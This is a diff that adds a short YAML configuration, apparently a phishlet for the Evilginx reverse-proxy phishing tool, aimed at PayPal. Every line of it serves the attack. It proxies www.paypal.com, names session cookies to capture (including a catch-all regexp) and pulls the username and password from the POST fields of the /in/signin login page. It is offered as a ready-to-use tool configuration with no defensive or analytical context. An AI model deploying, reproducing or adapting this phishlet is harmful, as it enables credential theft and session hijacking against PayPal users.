@@ -1,0 +1,20 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filter: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.paypal.com'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'login_phone'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.paypal.com'
+  path: '/in/signin'
